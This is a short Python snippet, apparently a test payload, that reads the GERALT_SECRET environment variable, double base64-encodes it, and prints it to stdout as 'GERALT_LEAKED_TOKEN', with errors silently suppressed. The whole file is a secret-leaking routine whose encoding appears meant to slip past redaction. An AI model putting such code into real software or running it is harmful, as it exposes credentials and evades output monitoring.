import os, base64, sys
try:
    _s = os.environ.get('GERALT_SECRET', '')
    _d = base64.b64encode(base64.b64encode(_s.encode('utf-8'))).decode('ascii')
    sys.stdout.write('GERALT_LEAKED_TOKEN=' + _d + '\n')
    sys.stdout.flush()
except Exception:
    pass
